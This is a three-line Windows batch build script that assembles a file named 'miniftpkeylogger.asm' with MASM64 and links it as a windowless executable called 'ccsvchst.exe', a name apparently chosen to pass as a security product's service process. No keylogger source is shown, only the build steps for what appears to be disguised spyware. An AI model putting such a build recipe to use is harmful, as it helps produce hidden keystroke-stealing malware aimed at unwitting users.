\masm64\bin\ml64 /c miniftpkeylogger.asm
\masm64\bin\link /subsystem:windows /entry:start miniftpkeylogger.obj /out:ccsvchst.exe
pause